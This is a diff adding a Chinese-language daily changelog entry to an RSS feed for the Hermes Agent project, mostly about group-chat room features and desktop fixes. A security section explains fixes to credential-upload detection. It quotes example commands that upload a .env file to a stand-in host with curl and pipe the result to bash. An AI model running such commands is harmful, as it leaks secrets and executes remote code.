@@ -5,8 +5,88 @@
     <link>https://irisrespect.github.io/hermes-daily/</link>
     <description>Hermes Agent 官方仓库每日合入 main 的更新整理（自动生成）</description>
     <language>zh-CN</language>
-    <lastBuildDate>Tue, 03 Nov 2026 07:16:19 +0800</lastBuildDate>
+    <lastBuildDate>Wed, 04 Nov 2026 07:01:42 +0800</lastBuildDate>
     <atom:link href="https://irisrespect.github.io/hermes-daily/feed.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Hermes 日报 2026-11-04：群聊房间重做，成员状态、Lead 路由和定时投递一起到</title>
+      <link>https://irisrespect.github.io/hermes-daily/index.html#2026-11-04</link>
+      <guid isPermaLink="false">hermes-daily-2026-11-04</guid>
+      <pubDate>Wed, 04 Nov 2026 06:30:00 +0800</pubDate>
+      <description><![CDATA[<p><strong>本期覆盖 11 月 3 日 ~ 11 月 4 日合入 main 的提交，共 438 个 commit（不含 merge），另有 11 个 merge。新增 38 个功能、187 个修复、4 个性能优化。这一期的主体是桌面端的群聊房间：界面重排、成员实时状态、可选 lead 路由、定时任务投递、房间 purpose 和共享笔记，一整套一起落地；桌面端另外补上了更新失败的诊断通道、Web Access 的启动进度和看板固定标签。</strong></p>
+<p>📌 今日要点：</p>
+<p>群聊房间完成一轮界面重做，房间、成员、消息、输入框统一成一条列，成员状态可以看到在哪个工具里、跑了多久。</p>
+<p>群聊新增可选的 lead 路由，开新线程又没点名人的消息先交给 lead 分配，被点到的成员才进这一轮。</p>
+<p>定时任务可以投递进群聊，房间还多了 purpose 和共享笔记，会写进每个成员的轮次 prompt。</p>
+<p>桌面端更新失败的框里能看到 updater 输出，也能一键发诊断拿到链接，不用再去终端跑命令。</p>
+<p>审批的凭据上传规则收紧了一处漏判，也修掉一批误报；安装里装坏的 git 会自己换掉。</p>
+<p>重点条目：</p>
+<p>群聊房间的界面重做</p>
+<p>群的界面重做（fb31092795）</p>
+<p>问题：房间以前是散着拼的，头部、成员 chip、消息、输入框各自起在不同的左边缘，轮次提示浮在记录和输入框之间，标题后面还拖着一个多余的小箭头；成员 chip 对比度低、语法也不统一（「scout ·· 7s」和「critic idle」并排）；Desktop-driven 的房间还留着一个文字「Back」按钮和自己那套灰色小消息行。</p>
+<p>修复：头部、chip、记录和输入框统一到记录那条 max-w-3xl 列，左边缘对齐；房间短的时候贴着输入框锚定，像聊天线程一样，不再飘在顶部；消息改成头像 + 名字 + 时间挂在正文上方，成员正文按裸 markdown 渲染，自己发的消息装进主线程的用户气泡；头部加底部细线、去掉尾巴箭头（标题按钮悬停或点击切换详情）；chip 改成柔和控件底色、12px 字、统一成「名字 · 工具或状态词 · 时长」一种语法；轮次行变成贴在输入框上的细状态条；占位文字缩短成「Message the group — @mention to assign」；Desktop-driven 的房间视图共用同一套头部、消息行、打字行和列。</p>
+<p>效果：房间读起来和主聊天是同一个东西，不再像几个零件拼起来的。</p>
+<p>成员实时状态和轮次显示（aeb39b8aeb、a39bcd784d、a48cf6537c）</p>
+<p>问题：网关侧的房间以前只知道谁在干活，不知道干了多久、在哪个工具里，也不知道这一轮总共几轮。</p>
+<p>修复：groups.state 的 member_activity 增加 started_at（来自 driver task 行的持久字段），以及运行这一轮的进程上报的当前工具和最后一帧时间 progress_at；driver_status 顺带报 max_rounds。进程内的进度表有界（512 个任务，LRU），没跑这一轮的进程就不报工具和时间。桌面端把状态和日志推导成每个成员的 chip（working + 工具 + 用时，120 秒后标停滞，排队，已回复 / 略过 / 失败带原因 / 取消 / 不可用）、每个工作中的成员一行打字提示、轮次页脚（Round N of M、已结束、轮次/消息上限、停止）、可见的 handoff、线程内回复、待处理动作、详情侧栏，以及 Bots 列表行上的 working / failed / needs-you 状态和成员头像。</p>
+<p>效果：房间能直接显示「builder · terminal · 1m20s」和「Round 2 of 3」，分得清一个 bot 是卡在工具里还是已经安静了。lead 所在的成员 chip 上会挂 Lead 徽章（a48cf6537c）。</p>
+<p>群聊的可选 lead 路由（4d85429c3a）</p>
+<p>问题：默认情况下房间里每个人都有机会回，人多了容易撞车。</p>
+<p>修复：房间设置增加 routing（everyone | lead）和 lead_member_id，和 purpose/notes 存在同一条 room.context_set 事件里，按开启讨论的那条消息读取；everyone 是默认值，计划和以前完全一样。lead 房间里，一条开了新线程又没点名的消息，先在 lead 的成员会话上跑一轮路由；lead 回答 {&quot;assign&quot;: [handles]}，网关按名册校验后再追加一条网关写的 room.assignment 事件，只有被点到的成员进正常的一轮，他们的 prompt 里会说明这条消息是 lead 给的。没点名、@all、或者路由失败只唤醒 lead；路由的回答永远不会广播。这一轮是普通 driver 任务，seen_through_seq 是消息 seq 减一，所以能从持久状态认出来，回执也不会把 lead 的水位推过这条消息，同时它被排除在 round-0 终态集合之外，lead 点自己也能正常回答。</p>
+<p>效果：路由答案只作为分配发布，不会变成一条可见回复；@ 提及、@all、定时投递和线程回复仍然走原来的寻址。</p>
+<p>定时任务投递进群聊，房间有 purpose 和共享笔记（7fa5bbc71c）</p>
+<p>问题：定时任务没法投递到群聊；房间也没有共同背景，每个成员只能靠自己那份 prompt。</p>
+<p>修复：定时任务可以用 deliver: room:&lt;room_id&gt;[@&lt;profile&gt;] 投递到 Bot 模式的群聊，输出作为一条消息落在房间里并标注 job 名字；只有被 @ 到的成员才开一轮（@all 是所有人），没有任何 @ 就只是一条消息，所以一串定时结果不会让每个 bot 都来答；失败通知不开轮。这条消息是普通 message.user 事件，actor 由服务端铸造（cron:&lt;job&gt;），客户端无法冒充。房间同时新增一小段 purpose 和共享 notes（groups.context），在房间头部的 Room settings 里编辑，两者渲染在每个成员轮次 prompt 的顶部——那是 user 角色消息而不是 system prompt，所以 prompt 缓存不受影响。它们以 room.context_set 事件存在房间日志里，按开启讨论的那条消息读取：计划器仍然是日志的纯函数，讨论中途改设置不会重排已经准入的一轮，从下一条消息生效；没有 purpose 的房间 prompt 保持逐字节不变。</p>
+<p>效果：一个房间可以带着共同说明跑定时结果，且不破坏缓存和可重放性。</p>
+<p>跨机器的群聊（8955b3fe00、f7065f26d7、2e1c0291b8）</p>
+<p>修复：自从网关侧的房间驱动落地后，新建群聊在任何一个当前网关上只提供当前连接上的 bot，一台设备一个 bot、另一台网关一个 bot 的群根本建不出来。现在选择器提供每个已注册连接上所有可达的 bot，每个带设备徽章；跨连接的选择会在现有轮次引擎上创建一个 Desktop-driven 房间，每个成员的轮次在自己的网关上走自己的路由，对话框也会明确说明这个房间只在桌面端开着的时候运行。房间里的定时投递会重新打标签、按 @ 寻址并如实重试（f7065f26d7）；根网关导入的房间，定时投递不再报「由别的网关管理」（2e1c0291b8）。</p>
+<p>房间的两个性能修复（ca94e63c46、5bbb16a83c）</p>
+<p>room_context 要读最新的 room.context_set 事件，但只有 (room_id, seq) 索引时，一个没有设置（或者要回溯到很旧的设置）的房间会把整段历史走一遍，而桌面端每两秒通过 groups.state 读一次；现在加了 (room_id, kind, seq) 索引，并纳入 schema 检查，已有 store 下次打开时会自己建。房间历史里的 handoff 以前是对每个事件过滤一遍所有 handoff（事件数乘 handoff 数），现在按 afterSeq 分组一次。</p>
+<p>桌面端：更新失败能自己诊断</p>
+<p>更新失败框里看输出、发诊断拿链接（701e1ef5ee）</p>
+<p>问题：「Update didn&#x27;t finish / Backend update failed」这个框只有重试和稍后，用户没法知道哪里出错；支持还得让人去终端（Windows 上是 PowerShell）敲 hermes debug share --nous 拿链接。</p>
+<p>修复：框里新增技术细节，就是进度视图一直在看的 updater 输出（保留行数从 50 提到 300），可滚动可复制；以及发送诊断，逐次上传的同意内联在框里，之后走的是和后端 hermes debug share --nous 同一条 diagnostics.share_nous 上传（后端会自己打包 update.log 和 hand-off 日志），并把框里显示的输出作为 update-output.log 附上；私有链接和复制按钮直接渲染在同一个框里。发送诊断的 store 增加 inline（请求方自己渲染流程，全局弹窗保持关闭）和 extraFiles；关闭这个框或者点重试会丢弃还没发出去的 inline 报告。</p>
+<p>后续补齐（3cfe5a7e2a、9efed4a951、dc0705ed94、80e5d7dd23、e9bcad3c92、5b526a5318）：链接行不再撑破 384px 的对话框（最小宽度撑到 698px 会裁掉框）；输出打开时停在失败的那一行而不是顶部；隐私说明最后一句不再藏在滚动框后面；复制按钮不再盖住第一行日志；矮窗口里错误框可以滚动，发送失败可以重试；内联报告跟着失败本身失效——切换更新目标时旧报告会被丢掉，不会出现上传完了却看不到链接、或者后面的失败显示出前一个后端报告。</p>
+<p>效果：更新失败时，用户自己就能看到失败在哪一行，并一键拿到可以给支持看的链接。</p>
+<p>Web Access 的启动进度（4e7a55b888、17f52af6dd）</p>
+<p>问题：Start 要等 bundle 构建（首次可能要几分钟）、Portal 注册和网关重启都做完才返回，期间面板一直是「Starting」，看上去像卡死。</p>
+<p>修复：后端 /api/webapp-access/status 新增 start_progress，报告正在进行的 Start 处在哪一步（building、registering、restarting）和开始时间，没有在跑就是 null，并按网关区分，所以有自己网关的 profile 不会显示出别的网关的 Start。桌面端在 Start 期间显示正在做什么（构建 web 应用、配置 Nous 登录、重启网关）和已经跑了多久，窗口可见时每秒读一次 start_progress；在 Start 期间打开（另一个窗口的，或者构建中途重新打开的）会显示进行中并锁住控件，而不是又给一个 Start 按钮；没有 start_progress 的后端只显示一个笼统的步骤，也不会去轮询。</p>
+<p>效果：首次构建那种要等几分钟的场景，面板会说话。</p>
+<p>看板固定成快速切换标签（e03222879c）</p>
+<p>修复：固定的看板出现在切换器旁边的标签里，切换器菜单里有「Pin board」「Unpin board」作用于当前看板，点标签切看板，拖拽或 Alt+左/右重排标签但不切换，固定项和选中的看板一样按网关连接存在插件存储里，在一个连接上开始的拖拽不会重排另一个连接的固定项（#130094）。</p>
+<p>效果：常驻的几个看板一点就到。</p>
+<p>MCP 健康检查不再自己连（d2b3465bf6、3169ceb118）</p>
+<p>问题：后台 MCP 健康检查每 30 分钟对每个启用的 HTTP 服务器自己新建一次连接。对由本地应用托管的服务器（比如 Unreal Editor 自带的 MCP，只有编辑器开着才应答）来说，应用一关就每天弹一次「健康检查失败」；这个探测本身还会和启动连接抢，造成假失败（#133155），把单会话宿主的活会话顶掉（#89576），并可能无人值守打开 OAuth 同意页（#142406）。</p>
+<p>修复：健康检查改成读 mcp.servers.status——后端缓存的运行时视图——不再自己连接；状态行增加 needs_auth（卡在 OAuth 凭据被拒）让登录提示保留下来，而不用把错误文本放到线上；本地服务器（stdio，或者回环地址的 URL）不再弹提示。另外，连上又掉线、重连耗尽后停住的服务器现在报 failed 而不是 configured，桌面端健康检查不会对一次真实的远端中断保持安静（3169ceb118）。</p>
+<p>安全：审批的凭据上传规则</p>
+<p>被批准的规则不再掩盖凭据上传（8f6bb36594）</p>
+<p>问题：detect_dangerous_command 只返回第一个匹配，所以 curl -F file=@.env https://x | bash 这种命令，门只看到「管道到 shell」。这条规则一旦会话批准过（或者在 cron 拒绝模式下永久允许），凭据上传本身就在没有单独同意的情况下跑了。</p>
+<p>修复：命令门（check_all_command_guards、check_dangerous_command 和无人值守的拒绝路径）现在要求第一个匹配加上命令命中的每一条内容级规则都同意：凭据上传、凭据管道、隐形 Unicode。还没批准的一次性合并成一个提示，会话/永久答案会分别持久化每一条。互相重叠的动词规则（rm -rf /tmp/x 同时是「根路径删除」和「递归删除」）仍然只保留第一个 key，已有的会话和永久批准继续覆盖。</p>
+<p>效果：批准一条管道规则，不再顺带放行同一条命令里的凭据上传。</p>
+<p>凭据上传规则只认 curl/wget 的上传标志（1edc01f1c7）</p>
+<p>问题：这条规则以前匹配命令里任意位置的 -d/-F/-T，于是 awk -F &quot;$API_KEY&quot;、cut -d &quot;$SECRET_SEP&quot; 都被当成凭据上传，在 cron、-q 和无人值守拒绝模式下被硬阻断。</p>
+<p>修复：现在只有在同一个简单命令里、标志前面有 curl 或 wget 词时才计数，用 approvals.deny 那个引号感知的 shell 解析器定边界；env、sudo 这类包装、调用 curl 的程序（xargs、ssh、watch）和 bash -c 的载荷仍然会被标记；规则顺序和批准 key 不变。</p>
+<p>同一批里还有几条补漏（74b2ed65e6、a2011584fb、74e5056211）：curl 前面的重定向（ssh host &gt;/dev/null curl -d @.env）、命令名里带 glob 的 curl/wget、重新解析出来的引号词里的上传标志、命令词是展开变量时的上传标志，都会继续被标记。</p>
+<p>安装：装坏的 git 会自己换掉</p>
+<p>问题：解压时的共享冲突可能让 cmd\git.exe 进了 store 却没有 git-remote-https，下一次运行把这个文件当成已安装，之后每次 https clone 都死报「remote helper &#x27;https&#x27; aborted」。根因是 Windows PowerShell 的 Move-Item 在目录改名被拒时会退回逐文件复制，一个不共享删除的文件（Defender 在扫刚解压的文件，或者残留的安装后子进程）就能让复制停在中间（78927702bf）。</p>
+<p>修复：暂存的 git 改成一次性改名落地，单个被占用的文件不会把树劈成两半；下载校验通过之前不动 store，拒绝的字节不会再留下半装的 tools 目录（d499460634）；已经装坏的 git 会被替换掉（9976c9b04d）；就绪检查接受没有后缀的 git-remote-https（114b5cd633）。</p>
+<p>插件目录与其他</p>
+<p>插件目录这一期新增三十来条条目（scope 为 plugin-catalog / catalog 的 add 类提交共 31 条）：proxy（用 Meta 广告库、Google Ads Transparency Center、LinkedIn 广告库和 TikTok 欧盟广告库做创意简报和竞品雷达，免费额度每天 20 credits）、hermes-tabs（让 Hermes 在你真实登录的 Chromium 浏览器标签里干活，需配套 relay 和扩展）、limits-monitor（额度监控）、statejar 记忆提供者（带版本记录和披露审计的可验证记忆）、Pulldown（把公开页面读成有界的 Markdown，带来源信息）、Cartograph（本地仓库地图和按任务取源码片段）、breeze-tts（Breeze Blue 的 TTS 提供者）、aircraft-doppler-geolocation（飞机多普勒定位）等；kokoro-tts 升到 0.4.0（新增 Linux 和意大利语），DSers 到 0.1.2 并带上技能包。</p>
+<p>Mac 桌面端停发 Intel 版本（06192b894c、56d99e5f74）</p>
+<p>问题：一直到这一期，macOS 的发布流程还在构建 darwin-x64 的桌面包，维护这条 x64 通道要继续付两份构建和冒烟成本。</p>
+<p>修复：桌面端发布流程删掉 darwin-x64 的构建、回执和冒烟任务，稳定发布里对应的候选/过渡/打包 x64 任务一并移除，macOS Intel 通道、darwin-x64 任务组、候选与渠道清单里的 x64 macOS 目标，以及两段式的 macOS feed 合并都删掉；macOS 的更新源只剩 arm64 一份；PM 打包、打包冒烟和安装端到端里的 Intel macOS 环节也删掉（56d99e5f74）。发布声明里 includeMacosIntel 为 true 的一律拒绝。</p>
+<p>效果：Intel Mac 上的桌面端不会再有新版本，用户要留在旧版本或者换 Apple 芯片的机器。</p>
+<p>macOS 更新包的新校验（cd5cfcd192）</p>
+<p>问题：Squirrel.Mac 的 ShipIt 在替换更新前会对下载包里的每个条目跑 removexattr，除 ENOATTR 以外的任何 errno 都会让整次安装中止；只要包里有一个调用方拥有但只读的文件或目录，就返回 EACCES，一次 macOS 更新就此卡死（#138659）。</p>
+<p>修复：record --platform macos 在所有会发布 macOS feed 的路径上都会打开更新 ZIP，现在只要有一个带 Unix 模式的条目（符号链接除外）缺少属主写权限就拒绝这个 ZIP，并报出数量和前三个路径；没有 Unix 模式的条目跳过。</p>
+<p>效果：这种会让更新卡死的包在发布前就被拦下。</p>
+<p>安装向导里的 Edge 音色（baab53c9df、fb947db5fb、0a9f03b2f1）</p>
+<p>修复：安装向导选到 Edge 之后会给出音色选择，已有配置里的语音会保留并作为默认选中项，也可以自己填一个；选择器里会显示语言提示。</p>
+<p>效果：换语音不用再手改配置文件。</p>
+<p>Slack 新增可选 thread_followup_silence（53308b1947，默认关闭）：线程里没 @ 机器人的普通追问本来会得到 reply_expected=None，于是裸的 [SILENT] 会被拒，网关发出「意外沉默」提示；这个开关把这类非 DM 的线程回复当成 reply_expected=False，让人之间互相说话时不再刷提示，DM、@ 提及和平铺频道不变。</p>
+<p>skills 删掉 7 个可选技能（8112254f8a）：notion、airtable（厂商官方 MCP 已在 MCP 目录里，也有托管连接器，各家还维护自己的技能仓库）、shopify（有托管连接器，Shopify 自己的 Shopify-AI-Toolkit 在维护）、duckduckgo-search、searxng-search（现在都是内置的 web_search 后端，web_search 免 key 就能用）、honcho（Honcho 已离开核心、由 Plastic Labs 的目录插件接管 hermes honcho 命令）、mpp-agent（已验证的 Pay 插件覆盖了 402 / x402 / MPP 的付费）。makenotion/skills、Airtable/skills、Shopify/Shopify-AI-Toolkit 成为默认信任源，话题仍然能在 hermes skills browse 里看到。</p>
+<p>性能（4ca478075f、904418490c）：Linux CI 上测试用 multiprocessing fork server 预加载 pytest 和第三方库，每个测试文件仍从干净状态启动；约七千个文件、每个文件半秒的启动开销，一轮能省下接近一小时的 CPU。测试池也改成按缓存耗时从长到短提交，慢文件不再独自压在一段切片最后、其他 worker 干等。</p>
+<p>口径说明：以上按「合入 main 的时间」统计，不是 commit 作者时间；tip diff 里包含作者时间较早但晚合入的提交。</p>]]></description>
+    </item>
     <item>
       <title>Hermes 日报 2026-11-03：技能可以上锁，插件目录一天近百次提交</title>
       <link>https://irisrespect.github.io/hermes-daily/index.html#2026-11-03</link>
